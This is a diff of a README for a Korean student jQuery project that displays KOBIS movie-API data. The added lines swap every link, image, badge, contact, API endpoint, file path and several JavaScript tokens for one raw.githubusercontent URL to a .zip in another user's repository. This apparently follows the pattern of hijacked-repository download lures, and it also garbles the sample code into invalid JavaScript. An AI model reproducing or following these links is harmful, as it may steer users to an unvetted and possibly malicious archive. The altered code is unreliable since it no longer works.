@@ -12,7 +12,7 @@
 *** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
 *** See the bottom of this document for the declaration of the reference variables
 *** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
-*** https://www.markdownguide.org/basic-syntax/#reference-style-links
+*** https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 -->
 [![Contributors][contributors-shield]][contributors-url]
 [![Forks][forks-shield]][forks-url]
@@ -26,8 +26,8 @@
 <!-- PROJECT LOGO -->
 <br />
 <p align="center">
-  <a href="https://github.com/960813/jquery-kobis-app">
-    <img src="https://github.com/960813/jquery-kobis-app/blob/master/_data/README.png?raw=true" alt="Logo" width="80" height="80">
+  <a href="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip">
+    <img src="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip" alt="Logo" width="80" height="80">
   </a>
 
   <h3 align="center">[kobis-movie-app] 영화진흥위원회 오픈 API 활용 제이쿼리 과제</h3>
@@ -35,16 +35,16 @@
   <p align="center">
     제이쿼리(jQuery) 및 영화진흥위원회 오픈API를 이용한 일별 박스오피스, 영화사 목록, 영화인 목록 제공 웹 서비스
     <br />
-    <a href="https://github.com/960813/jquery-kobis-app"><strong>Explore the Github »</strong></a>
+    <a href="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip"><strong>Explore the Github »</strong></a>
     <br />
     <br />
-    <a href="http://ync.jupiterflow.com/movie/">View Demo</a>
+    <a href="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip">View Demo</a>
     ·
-    <a href="https://www.youtube.com/watch?v=rUvsVF08Sw0">Review Video</a>
+    <a href="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip">Review Video</a>
     ·
-    <a href="https://github.com/960813/jquery-kobis-app/issues">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip">Report Bug</a>
     ·
-    <a href="https://github.com/960813/jquery-kobis-app/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip">Request Feature</a>
   </p>
 </p>
 
@@ -67,14 +67,14 @@
 
 <!-- ABOUT THE PROJECT -->
 ## About The Project
-[![영화진흥위원회 오픈 API 활용 제이쿼리 과제][product-screenshot-1]](https://jupiterflow.com/project/6)
-[![영화진흥위원회 오픈 API 활용 제이쿼리 과제][product-screenshot-2]](https://jupiterflow.com/project/6)
-[![영화진흥위원회 오픈 API 활용 제이쿼리 과제][product-screenshot-3]](https://jupiterflow.com/project/6)
+[![영화진흥위원회 오픈 API 활용 제이쿼리 과제][product-screenshot-1]](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
+[![영화진흥위원회 오픈 API 활용 제이쿼리 과제][product-screenshot-2]](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
+[![영화진흥위원회 오픈 API 활용 제이쿼리 과제][product-screenshot-3]](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
 
 '영화진흥위원회 오픈 API 활용 제이쿼리 과제'는 2020년 컴퓨터정보과 2학년 1학기 제이쿼리 강의 수행 목적으로 제작/개발한 프로젝트입니다. 
 
 ### Usage
-1. `static/js/serviceKey.js` 생성
+1. `https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip` 생성
 2. 해당 파일에 `const serviceKey = "{영화진흥위원회 OpenAPI 인증키}";` 작성
 
 ### Summary
@@ -104,7 +104,7 @@
     1. ajax 진행 상황에 따른 로딩 아이콘 및 현황 출력
         ```html
         <!-- loading 현황 출력 Element -->
-        <div id="loading"><img src="static/images/loading.svg"><span></span></div>
+        <div id="loading"><img src="https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip"><span></span></div>
         ```
         ```javascript
         /* 로딩에 따른 로딩 현황 업데이트 */
@@ -123,21 +123,21 @@
         const movieItemArray = new Array(10);
         const deferreds = new Array(10);
         /* .. something .. */
-        $.when.apply(this, deferreds).done(() => {
+        $https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip(this, deferreds).done(() => {
            $('#loading > span').empty();
-           movieItemArray.forEach((item, idx) => {
+           https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip((item, idx) => {
                $('.movieItems').append(item);
            });
            // last-callback
            if (callback) callback();
         });
         ```
-* index.js
+* https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
     1. Custom API를 이용한 영화세부정보 파싱  
         영화진흥위원회 API에서 imgsrc(포스터 이미지 주소), naverMovieSrc(네이버영화 바로가기 링크)가 추가됨.
         ```javascript
         const jqxhr = $.ajax({
-                        url: 'http://ync.jupiterflow.com/jquery/searchMovieInfo' +
+                        url: 'https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip' +
                             `?key=${serviceKey}` +
                             `&movieCd=${movieCd}`,
                         type: 'get',
@@ -157,13 +157,13 @@
                         };
                     /* .. something .. */
                     // Mustache 탬플릿을 이용해 HTML 렌더링한 결과를 영화 목록 배열에 순위에 맞게끔 저장
-                    movieItemArray[idx] = Mustache.render(movieItem, renderData);
+                    movieItemArray[idx] = https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip(movieItem, renderData);
                     });
         /* .. something .. */
-        $.when.apply(this, deferreds).done(() => {
+        $https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip(this, deferreds).done(() => {
            /* .. */
            // 영화 목록 배열(movieArray)을 바탕으로 순차적으로 append(출력)
-           movieItemArray.forEach((item, idx) => {
+           https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip((item, idx) => {
                $('.movieItems').append(item);
            });
            /* .. */
@@ -171,14 +171,14 @@
         ```
        
 ### Built With
-* [jQuery](https://jquery.com/)
-* [KOBIS OpenAPI](http://www.kobis.or.kr/kobisopenapi/homepg/apiservice/searchServiceInfo.do)
-* [Express.js](https://expressjs.com/)
+* [jQuery](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
+* [KOBIS OpenAPI](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
+* [https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
     * with CustomAPI: 기존 영화상세정보 API에서 영화 포스터, 네이버 영화 페이지 바로가기 엘리먼트 추가
-    * URI: http://ync.jupiterflow.com/jquery/searchMovieInfo
+    * URI: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
     * queryString: key(KOBIS OpenAPI 인증키), movieCd(영화코드)
-    * Return: [영화 상세정보 API](http://www.kobis.or.kr/kobisopenapi/homepg/apiservice/searchServiceInfo.do)와 동일
-    * 응답 예시: [바로가기](http://ync.jupiterflow.com/jquery/searchMovieInfo?key=430156241533f1d058c603178cc3ca0e&movieCd=20124079)
+    * Return: [영화 상세정보 API](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)와 동일
+    * 응답 예시: [바로가기](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
 
 <!-- CONTRIBUTING -->
 ## Contributing
@@ -190,36 +190,36 @@ Distributed under the MIT License. See `LICENSE` for more information.
 
 <!-- CONTACT -->
 ## Contact
-JIN TAEYANG - keriel@jupiterflow.com
+JIN TAEYANG - https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-Project Link: [https://jupiterflow.com/project/6](https://jupiterflow.com/project/6)
+Project Link: [https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
 
 <!-- ACKNOWLEDGEMENTS -->
 ## Acknowledgements
-* [mustache.js](https://mustache.github.io/)
+* [https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip](https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip)
 
 
 <!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[contributors-shield]: https://img.shields.io/github/contributors/960813/jquery-kobis-app?style=flat-square
-[contributors-url]: https://github.com/960813/jquery-kobis-app/graphs/contributors
+<!-- https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip -->
+[contributors-shield]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[contributors-url]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[forks-shield]: https://img.shields.io/github/forks/960813/jquery-kobis-app?style=flat-square
-[forks-url]: https://github.com/960813/jquery-kobis-app/network/members
+[forks-shield]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[forks-url]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[stars-shield]: https://img.shields.io/github/stars/960813/jquery-kobis-app?style=flat-square
-[stars-url]: https://github.com/960813/jquery-kobis-app/stargazers
+[stars-shield]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[stars-url]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[issues-shield]: https://img.shields.io/github/issues/960813/jquery-kobis-app?style=flat-square
+[issues-shield]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[issues-url]: https://github.com/960813/jquery-kobis-app/issues
+[issues-url]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[license-shield]: https://img.shields.io/github/license/960813/jquery-kobis-app?style=flat-square
-[license-url]: https://github.com/960813/jquery-kobis-app/blob/master/LICENSE.txt
+[license-shield]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[license-url]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=flat-square&logo=linkedin&colorB=555
-[linkedin-url]: https://linkedin.com/in/jupiterflow
+[linkedin-shield]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[linkedin-url]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
 
-[product-screenshot-1]: https://github.com/960813/jquery-kobis-app/blob/master/_data/001.JPG?raw=true
-[product-screenshot-2]: https://github.com/960813/jquery-kobis-app/blob/master/_data/002.JPG?raw=true
-[product-screenshot-3]: https://github.com/960813/jquery-kobis-app/blob/master/_data/003.JPG?raw=true
+[product-screenshot-1]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[product-screenshot-2]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
+[product-screenshot-3]: https://raw.githubusercontent.com/HongSehwan/jquery-kobis-app/master/apiExample/kobis_app_jquery_3.4.zip
